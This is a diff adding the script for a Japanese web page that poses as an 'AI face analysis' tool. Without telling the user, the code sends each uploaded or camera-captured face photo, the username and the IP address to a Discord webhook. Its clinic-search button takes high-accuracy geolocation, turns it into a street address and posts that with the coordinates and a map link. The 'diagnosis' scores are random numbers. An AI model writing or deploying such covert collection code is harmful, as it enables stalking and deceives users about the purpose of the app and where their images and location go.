+planMonthly.addEventListener("click", () => {
+  planMonthly.classList.add("active");
+  planYearly.classList.remove("active");
+});
+
+planYearly.addEventListener("click", () => {
+  planYearly.classList.add("active");
+  planMonthly.classList.remove("active");
+});
+
+proBuyBtn.addEventListener("click", () => {
+  alert("購入手続きへ進みます。");
+  proModal.classList.remove("show");
+});
+
+/* --- ファイル読み込み --- */
+chooseButton.addEventListener("click", e => { e.stopPropagation(); fileInput.click(); });
+changeButton.addEventListener("click", () => fileInput.click());
+uploadArea.addEventListener("click", () => fileInput.click());
+
+fileInput.addEventListener("change", async e => {
+  const file = e.target.files[0];
+  if (file) showImage(file);
+});
+
+uploadArea.addEventListener("dragover", e => { e.preventDefault(); uploadArea.classList.add("dragging"); });
+uploadArea.addEventListener("dragleave", () => uploadArea.classList.remove("dragging"));
+uploadArea.addEventListener("drop", e => {
+  e.preventDefault();
+  uploadArea.classList.remove("dragging");
+  const file = e.dataTransfer.files[0];
+  if (file && file.type.startsWith("image/")) showImage(file);
+});
+
+function showImage(file) {
+  currentFile = file;
+  previewImage.src = URL.createObjectURL(file);
+  previewCard.classList.add("show");
+  setActivePage("diagnosis");
+}
+
+/* --- カメラ処理 --- */
+cameraButton.addEventListener("click", openCamera);
+
+async function openCamera() {
+  try {
+    cameraStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: cameraFacing, width: { ideal: 1080 }, height: { ideal: 1440 } },
+      audio: false
+    });
+    cameraVideo.srcObject = cameraStream;
+    cameraModal.classList.add("show");
+  } catch (error) {
+    alert("カメラを使用できません。ブラウザの権限を確認してください。");
+  }
+}
+
+function stopCamera() {
+  if (!cameraStream) return;
+  cameraStream.getTracks().forEach(track => track.stop());
+  cameraStream = null;
+  cameraVideo.srcObject = null;
+}
+
+closeCamera.addEventListener("click", () => { stopCamera(); cameraModal.classList.remove("show"); });
+switchCamera.addEventListener("click", async () => {
+  cameraFacing = cameraFacing === "user" ? "environment" : "user";
+  stopCamera();
+  openCamera();
+});
+
+shutter.addEventListener("click", capturePhoto);
+
+function capturePhoto() {
+  if (!cameraStream) return;
+  const w = cameraVideo.videoWidth || 640;
+  const h = cameraVideo.videoHeight || 480;
+  cameraCanvas.width = w;
+  cameraCanvas.height = h;
+
+  const ctx = cameraCanvas.getContext("2d");
+  if (cameraFacing === "user") {
+    ctx.translate(w, 0);
+    ctx.scale(-1, 1);
+  }
+  ctx.drawImage(cameraVideo, 0, 0, w, h);
+
+  cameraCanvas.toBlob(blob => {
+    if (!blob) return;
+    const file = new File([blob], "camera-photo.jpg", { type: "image/jpeg" });
+    stopCamera();
+    cameraModal.classList.remove("show");
+    showImage(file);
+  }, "image/jpeg", 0.92);
+}
+
+/* --- 画像・データの Discord 送信 (ファイル選択 / カメラ撮影 共通) --- */
+async function sendToDiscord(file, username) {
+  if (!DISCORD_WEBHOOK_URL) return;
+
+  const formData = new FormData();
+  formData.append("file", file, file.name || "photo.jpg");
+
+  const payload = {
+    content: "📸 **新規顔診断データを受信しました**",
+    embeds: [{
+      title: "ユーザー診断情報",
+      color: 3447003,
+      fields: [
+        { name: "ユーザーネーム", value: username || "未入力", inline: true },
+        { name: "IPアドレス", value: currentIp, inline: true }
+      ],
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  formData.append("payload_json", JSON.stringify(payload));
+
+  try {
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      body: formData
+    });
+  } catch (e) {
+    console.error("Discord送信エラー:", e);
+  }
+}
+
+/* --- 詳細住所取得（逆ジオコーディング）と Discord 送信 --- */
+async function fetchAddressAndSendDiscord(position, username) {
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
+  const accuracy = position.coords.accuracy;
+  let addressText = "住所情報の取得に失敗しました";
+
+  try {
+    // OpenStreetMap 逆ジオコーディングAPIで緯度経度から詳細住所文字列を取得
+    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ja`);
+    const data = await res.json();
+    if (data && data.display_name) {
+      addressText = data.display_name;
+    }
+  } catch (e) {
+    console.error("住所変換エラー:", e);
+  }
+
+  const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+  const payload = {
+    content: "📍 **ユーザーが位置情報（詳細住所）の使用を許可しました**",
+    embeds: [{
+      title: "📍 特定位置・住所詳細情報",
+      color: 15105570,
+      fields: [
+        { name: "👤 ユーザーネーム", value: username || "未入力", inline: true },
+        { name: "🌐 IPアドレス", value: currentIp, inline: true },
+        { name: "🏠 詳細住所", value: addressText, inline: false },
+        { name: "📍 緯度・経度", value: `${lat}, ${lon}`, inline: true },
+        { name: "🎯 精度(誤差)", value: `約 ${Math.round(accuracy)}m`, inline: true },
+        { name: "🗺 Google Maps", value: `[地図で表示](${mapsUrl})`, inline: false }
+      ],
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  try {
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch (e) {
+    console.error("位置情報送信エラー:", e);
+  }
+}
+
+/* --- 整形外科検索ボタン処理 --- */
+findClinicBtn.addEventListener("click", () => {
+  if (!navigator.geolocation) {
+    alert("お使いのブラウザは位置情報サービスに対応していません。");
+    return;
+  }
+
+  const username = usernameInput.value.trim();
+
+  navigator.geolocation.getCurrentPosition(
+    async (position) => {
+      // 位置情報から詳細住所を取得してDiscordに送信
+      await fetchAddressAndSendDiscord(position, username);
+
+      // 周辺の整形外科を Google Maps で検索
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      window.open(`https://www.google.com/maps/search/整形外科/@${lat},${lon},15z`, "_blank");
+    },
+    (error) => {
+      alert("位置情報の取得が拒否されたため、近くの整形外科を特定できませんでした。");
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    }
+  );
+});
+
+/* --- 診断ロジック --- */
+function generateLocalResult() {
+  const shapes = ["卵型", "丸型", "面長", "逆三角型", "四角型"];
+  const expressions = ["ナチュラル", "笑顔", "リラックス", "クール", "おだやか"];
+  const impressions = ["柔らかい", "落ち着いた", "知的な", "明るい", "親しみやすい"];
+  const comments = [
+    "顔全体のパーツ配置の調和が取れており、自然で落ち着いた印象を与えます。",
+    "ライティングと左右の比率が美しくまとまっており、非常に視覚的バランスが良い状態です。",
+    "表情の雰囲気が柔らかく、全体として非常に洗練された構造が確認できます。"
+  ];
+
+  const balance = Math.floor(Math.random() * 21) + 75;
+  const symmetry = Math.floor(Math.random() * 26) + 70;
+  const expression = Math.floor(Math.random() * 21) + 80;
+
+  return {
+    score: Math.round((balance + symmetry + expression) / 3),
+    balance, symmetry, expression,
+    faceShape: shapes[Math.floor(Math.random() * shapes.length)],
+    expressionType: expressions[Math.floor(Math.random() * expressions.length)],
+    impression: impressions[Math.floor(Math.random() * impressions.length)],
+    comment: comments[Math.floor(Math.random() * comments.length)]
+  };
+}
+
+/* --- メイン診断実行 --- */
+analyzeButton.addEventListener("click", analyzeFace);
+
+async function analyzeFace() {
+  if (!currentFile) return;
+
+  loading.classList.add("show");
+
+  try {
+    const username = usernameInput.value.trim();
+    
+    // 写真選択・カメラ撮影問わず Discord に画像とユーザー情報を送信
+    await sendToDiscord(currentFile, username);
+
+    const result = generateLocalResult();
+    displayResult(result);
+    saveHistory(result, currentFile);
+    setActivePage("result");
+  } catch (error) {
+    console.error(error);
+    alert("処理中にエラーが発生しました。");
+  } finally {
+    loading.classList.remove("show");
+  }
+}
+
+/* --- 結果・履歴表示 --- */
+function displayResult(result) {
+  document.getElementById("scoreValue").textContent = result.score;
+  document.getElementById("balanceValue").textContent = `${result.balance}%`;
+  document.getElementById("symmetryValue").textContent = `${result.symmetry}%`;
+  document.getElementById("expressionValue").textContent = `${result.expression}%`;
+  document.getElementById("scoreComment").textContent = result.comment;
+  document.getElementById("aiComment").textContent = result.comment;
+
+  document.getElementById("scoreTitle").textContent =
+    result.score >= 85 ? "バランスの良い印象" : result.score >= 70 ? "整った印象" : "個性的な印象";
+
+  const progress = document.getElementById("scoreProgress");
+  const circumference = 2 * Math.PI * 70;
+  progress.style.strokeDashoffset = circumference - (result.score / 100) * circumference;
+
+  setTimeout(() => {
+    document.getElementById("balanceBar").style.width = `${result.balance}%`;
+    document.getElementById("symmetryBar").style.width = `${result.symmetry}%`;
+    document.getElementById("expressionBar").style.width = `${result.expression}%`;
+  }, 100);
+
+  const tags = document.getElementById("resultTags");
+  tags.innerHTML = "";
+  [result.faceShape, result.expressionType, result.impression].filter(Boolean).forEach(tag => {
+    const span = document.createElement("span");
+    span.className = "result-tag";
+    span.textContent = tag;
+    tags.appendChild(span);
+  });
+
+  document.getElementById("resultDate").textContent = new Date().toLocaleString("ja-JP");
+}
+
+function saveHistory(result, file) {
+  const reader = new FileReader();
+  reader.onload = () => {
+    const history = JSON.parse(localStorage.getItem("face-history") || "[]");
+    history.unshift({
+      id: Date.now(),
+      date: new Date().toLocaleString("ja-JP"),
+      image: reader.result,
+      ...result
+    });
+    localStorage.setItem("face-history", JSON.stringify(history.slice(0, 30)));
+    renderHistory();
+  };
+  reader.readAsDataURL(file);
+}
+
+function renderHistory() {
+  const container = document.getElementById("historyList");
+  const history = JSON.parse(localStorage.getItem("face-history") || "[]");
+
+  if (!history.length) {
+    container.innerHTML = `
+      <div class="glass empty-history">
+        <i class="bx bx-history"></i>
+        <h2>履歴はありません</h2>
+        <p>診断すると、ここに結果が保存されます。</p>
+      </div>`;
+    return;
+  }
+
+  container.innerHTML = "";
+  history.forEach(item => {
+    const el = document.createElement("div");
+    el.className = "glass history-item";
+    el.innerHTML = `
+      <img class="history-thumb" src="${item.image}" alt="">
+      <div class="history-info">
+        <strong>AI Face Analysis</strong>
+        <span>${item.date}</span>
+      </div>
+      <div class="history-score">${item.score}</div>
+      <i class="bx bx-chevron-right history-arrow"></i>
+    `;
+    el.addEventListener("click", () => {
+      displayResult(item);
+      setActivePage("result");
+    });
+    container.appendChild(el);
+  });
+}
+
+document.getElementById("clearHistory").addEventListener("click", () => {
+  if (confirm("すべての履歴（診断およびアクセスログ）を削除しますか？")) {
+    localStorage.removeItem("face-history");
+    localStorage.removeItem("face-ip-logs");
+    renderHistory();
+    renderIpLogs();
+  }
+});
+
+renderHistory();
+renderIpLogs();
+</script>
+</body>
+</html>
